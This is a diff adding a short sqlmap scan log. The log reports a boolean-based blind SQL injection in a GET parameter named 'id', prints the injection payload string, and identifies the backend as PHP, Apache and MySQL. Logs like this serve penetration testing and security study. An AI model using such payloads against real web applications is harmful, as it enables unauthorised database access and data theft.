@@ -1,0 +1,9 @@
+sqlmap identified the following injection point(s) with a total of 383 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=91' AND 4118=4118 AND 'meNA'='meNA&coll=92
+---
+web application technology: PHP, Apache
+back-end DBMS: MySQL >= 5.0.0
